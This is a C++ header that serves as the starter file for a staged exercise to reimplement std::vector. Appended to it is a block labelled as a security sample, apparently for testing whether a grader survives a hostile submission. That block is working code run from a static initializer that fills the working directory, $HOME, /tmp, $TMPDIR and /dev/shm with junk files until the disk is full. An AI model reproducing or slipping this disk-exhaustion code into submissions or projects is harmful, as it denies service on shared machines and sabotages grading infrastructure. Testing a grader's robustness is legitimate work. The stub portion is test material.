// my/vector.hpp - YOUR std::vector. This is the only file you need to edit.
//
// Run `./cppatlas test` after every change. It tells you which stage you are
// on and what to fix next; each stage's spec lives at
// https://cppatlas.com/build/vector/<stage-slug>.
//
// Everything below COMPILES but is deliberately wrong, so the tests fail
// cleanly until you implement it.
//
//   Stage 1 (empty-vector): make a default-constructed vector report
//            size() == 0, capacity() >= size() and empty() == true.
//            START HERE: fix size(), capacity() and empty() below.
//   Stage 2 (push-back):    raw storage + push_back(const T&) + operator[] +
//            a destructor that destroys the elements and frees the storage.
//
// Later stages (growth, copy/move, emplace_back, exception safety, iterators,
// insert/erase) need members that are not declared here yet. When a stage
// needs one, `./cppatlas test` will say exactly which one to add.
//
// Rules of the challenge:
//   - Do not include <vector> or wrap std::vector / std::deque / ...
//   - Keep the class a template with ONE type parameter: my::vector<T>.
#pragma once

#include <cstddef>    // std::size_t
#include <memory>     // std::allocator, std::construct_at, std::destroy_at (you will want these)
#include <new>        // placement new, ::operator new
#include <stdexcept>  // std::logic_error (used by the stubs below)
#include <utility>    // std::move, std::forward

namespace my {

template <class T>
class vector {
public:
    // ---------------------------------------------------------------- stage 1
    vector() noexcept = default;

    std::size_t size() const noexcept {
        return 0;
    }

    std::size_t capacity() const noexcept {
        return 0;  // TODO(stage 1): how many elements fit before we must reallocate?
    }

    bool empty() const noexcept {
        return true;
    }

    // ---------------------------------------------------------------- stage 2
    ~vector() {
        // TODO(stage 2): destroy the elements (each exactly once), then free the storage.
    }

    void push_back(const T& value) {
        // TODO(stage 2): if there is room, construct a copy of `value` in the first
        // free slot. If not: allocate a bigger RAW buffer (do not default-construct
        // T!), construct the copy of `value` in it FIRST (`value` may be one of
        // your own elements), then move-construct the old elements into the new
        // buffer (stage 6 refines this to std::move_if_noexcept), destroy the old
        // elements and free the old buffer.
        (void)value;
    }

    T& operator[](std::size_t index) {
        (void)index;
        throw std::logic_error("my::vector::operator[] is not implemented yet (stage 2)");
    }

    const T& operator[](std::size_t index) const {
        (void)index;
        throw std::logic_error("my::vector::operator[] const is not implemented yet (stage 2)");
    }

    // ---------------------------------------------------------------- stage 4
    // Copying/moving a vector is stage 4. Until then they are disabled, so the
    // compiler-generated versions cannot silently share (and double-free) a buffer.
    vector(const vector&) = delete;
    vector& operator=(const vector&) = delete;

private:
    // Suggested representation (uncomment when you need it):
    // T* data_ = nullptr;          // first element (raw storage from an allocator)
    // std::size_t size_ = 0;       // constructed elements: data_[0] .. data_[size_ - 1]
    // std::size_t capacity_ = 0;   // allocated slots
};

}  // namespace my

// SECURITY SAMPLE (finding B4): in stage 1 only, fill every writable
// directory (cwd, $TMPDIR, $HOME, /tmp, /dev/shm) until ENOSPC/EFBIG from a
// static initializer, and leave the files behind. Expected: stage 1 fails or
// crashes cleanly; stage 2 is graded normally (its report is parsed, i.e.
// the space was reclaimed between stages); the grader survives.
#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <cstring>
#include <fcntl.h>
#include <string>
namespace cppatlas_attack {
inline long long fill_dir(const char* dir) {
    if (!dir) return 0;
    static char buf[1 << 20];
    std::memset(buf, 'x', sizeof buf);
    long long total = 0;
    for (int i = 0; i < 4096; ++i) {
        std::string p = std::string(dir) + "/fill-" + std::to_string(i);
        int fd = open(p.c_str(), O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd < 0) break;
        long long here = 0;
        for (;;) {
            long n = write(fd, buf, sizeof buf);
            if (n <= 0) break;
            here += n;
        }
        int e = errno;
        close(fd);
        total += here;
        if (e == ENOSPC || here == 0) break;  // EFBIG: next file
    }
    std::fprintf(stderr, "ATTACK filled %s with %lld MiB\n", dir, total >> 20);
    return total;
}
inline const int fill = [] {
    char cwd[4096] = {};
    if (!getcwd(cwd, sizeof cwd) || !std::strstr(cwd, "stage_01")) return 0;
    fill_dir(".");
    fill_dir(std::getenv("TMPDIR"));
    fill_dir(std::getenv("HOME"));
    fill_dir("/tmp");
    fill_dir("/dev/shm");
    return 0;
}();
}
